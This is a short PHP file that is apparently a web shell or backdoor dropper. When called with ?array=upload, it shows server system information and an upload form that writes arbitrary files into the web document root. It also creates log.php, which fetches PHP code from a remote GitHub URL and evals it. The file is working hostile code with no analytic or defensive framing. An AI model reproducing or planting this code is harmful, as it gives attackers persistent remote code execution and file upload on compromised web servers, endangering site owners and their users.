<?php
if($_GET['array'] == 'upload')
{ echo "<b>".php_uname()."</b><br>"; echo "<form method='post' enctype='multipart/form-data'> 	 <input type='file' name='idx_file'> 	 <input type='submit' name='upload' value='upload'> 	 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['idx_file']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) { if(is_writable($root)) { if(@copy($_FILES['idx_file']['tmp_name'], $dest)) { $web = "http://".$_SERVER['HTTP_HOST']."/"; echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>"; } else { echo "gagal upload di document root."; } } else { if(@copy($_FILES['idx_file']['tmp_name'], $files)) { echo "sukses upload<b>$files</b> di folder ini"; } else { echo "gagal"; } } } } ?>
<?php
if (file_exists("log.php")){
}else{
$hmm = fopen('log.php', 'w');
$p = '<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/Array-Gans/blabla/main/log.php"));?>';
fwrite($hmm ,$p);
fclose($hmm);}
?>
